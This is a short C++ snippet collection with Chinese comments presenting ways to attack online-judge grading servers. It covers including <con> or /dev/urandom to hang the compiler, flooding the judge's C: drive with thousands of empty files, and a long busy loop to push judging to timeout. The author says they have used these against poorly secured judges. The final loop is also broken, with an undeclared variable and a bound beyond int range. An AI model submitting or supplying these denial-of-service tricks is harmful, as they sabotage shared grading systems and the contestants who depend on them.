
//第一种：

#include <con>            //针对 Windows
#include </dev/urandom>   //针对 Linux
//如果是像 Cena 那样的评测机，一旦遇到这一句，就会被卡死（详见刘汝佳《算法竞赛入门经典（第二版）》）。
//
//第二种：

for (int i = 0; i < 10000; ++i)
{
	string s = "C:\\";
	s += to_string(i); // C++11
	s += ".txt";
	ofstream fout(s, ios::out);
	fout.close();
}
//第二种方法，其实就是疯狂地在评测机的C盘新建文件。循环一直运行到超时，建立的文件数目会非常多。一旦打开C盘查看文件，就要卡很长时间来加载、显示那些零碎文件。威力不小。
//
//以上是自己曾经用过的两种方法。用来应对安全措施不完善的OJ，或者个人评测机。
//
//还有一种通用的办法：执行死循环，导致整体评测速度变慢。（目的是让本来几毫秒就能过去的评测需要等到超时）比如这样：

int main()
{
	int rp = 0; 
	for (i = 0; i < 10000000000; ++i)
		++rp;
	return 0;
}
